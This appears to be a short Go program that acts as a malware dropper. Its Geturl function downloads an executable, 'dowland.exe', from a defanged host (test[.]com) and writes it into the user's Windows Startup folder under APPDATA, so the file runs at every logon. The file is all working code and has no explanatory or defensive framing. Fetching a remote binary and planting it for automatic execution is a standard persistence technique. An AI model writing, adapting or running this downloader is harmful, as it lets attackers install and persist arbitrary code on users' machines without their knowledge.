package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

func DownloadFile(targetPath string, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server error: %s", resp.Status)
	}

	out, err := os.Create(targetPath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func Geturl() {
	appData := os.Getenv("APPDATA")
	savePath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "dowland.exe")

	fileURL := "https://test[.]com/dowland.exe"

	fmt.Println("Downloading...")
	err := DownloadFile(savePath, fileURL)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	fmt.Println("Okey!")
}